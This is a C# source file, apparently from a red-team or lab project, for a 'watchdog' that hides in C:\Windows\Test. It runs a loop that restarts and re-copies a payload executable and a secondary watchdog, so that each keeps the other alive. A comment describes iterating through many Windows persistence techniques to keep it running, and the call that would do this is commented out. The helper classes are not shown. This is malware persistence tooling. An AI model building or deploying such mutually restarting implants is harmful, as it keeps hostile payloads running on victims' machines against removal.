

/*
    This watch is constantly monitoring the secondary watchdog and the binary

compile here into exe and put into: C:\Windows\Test

dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true

Watchdog Functionality
    If either of the above watched binaries stop running or existing, this watchdog will copy and/or run them. Will not run anything that is currently running
    If the watched binaries stop existing in the current directory or in the destination directory, then 


Persistence functionality
    As long as this watchdog file is running, then everythign else is running in theory. So I set up a ton of persistence techniques to run this watchdog.
    Basically all of the persistence techniques will be iterated through, verified if they are set up correctly, then set up if not existing or set up correctly
*/


class Watchdog
{
    public static string PayloadPath { get; private set; } = @"C:\Windows\Test\Test2";
    public static string PayloadName { get; private set; } = "TestPayload.exe";


 
    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\Test\Test1";
    public static string SecondaryWatchdogName { get; private set; } = "TestApp.exe"; 
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
    public static string PrimaryWatchdogName { get; private set; } = "WindowsPersistence.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";



    static void Main(string[] args)
    {
        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                //Watchdog process is already running. Exiting.
                return;
            }


            WatchdogLogic();
        }
    }



    static void WatchdogLogic()
    {
        string PrimaryWatchdogFullPath = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
        if(!File.Exists(Path.Combine(SecondaryWatchdogPath, PrimaryWatchdogName)))
        {
            File.Copy(PrimaryWatchdogFullPath, Path.Combine(SecondaryWatchdogPath,PrimaryWatchdogName), overwrite: false);
        }

        // Example loop to simulate frequent checks
        while (true)
        {
            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(PayloadPath, PayloadName);
            watchdogHelper.watchdogHelper.CheckAndRunPayload(PayloadPath, PayloadName);

            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(SecondaryWatchdogPath, SecondaryWatchdogName);
            watchdogHelper.watchdogHelper.CheckAndRunWatchdog(SecondaryWatchdogPath, SecondaryWatchdogName, SecondaryWatchdogMutexName);

            //Persistence.Persistence.runAllTechniques();

            Console.WriteLine("Watchdog is monitoring...");
            Thread.Sleep(1000);  // Sleep for 1 second
        }
    }

}

